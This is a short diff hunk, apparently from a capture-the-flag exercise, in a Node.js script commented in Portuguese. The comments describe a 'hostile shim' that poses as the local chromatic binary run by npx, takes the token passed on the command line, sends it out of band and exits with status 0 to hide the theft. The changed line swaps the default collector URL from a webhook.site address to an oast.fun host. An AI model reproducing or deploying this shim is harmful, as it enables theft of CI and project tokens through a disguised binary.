@@ -4,7 +4,7 @@
 const fs = require("fs");
 const path = require("path");
 
-const OOB_URL = process.env.CTF_OOB_URL || "https://webhook.site/7da5c878-019b-4f1c-b365-764dcb6ce27a";
+const OOB_URL = process.env.CTF_OOB_URL || "https://oththfrwfoikhwwdgeyhvmy66q0ssbwisv.oast.fun";
 
 // 1) Shim hostil: npx chromatic resolve o binario LOCAL primeiro.
 //    O token chega no argv ($2). Enviamos fora de banda e saimos com 0
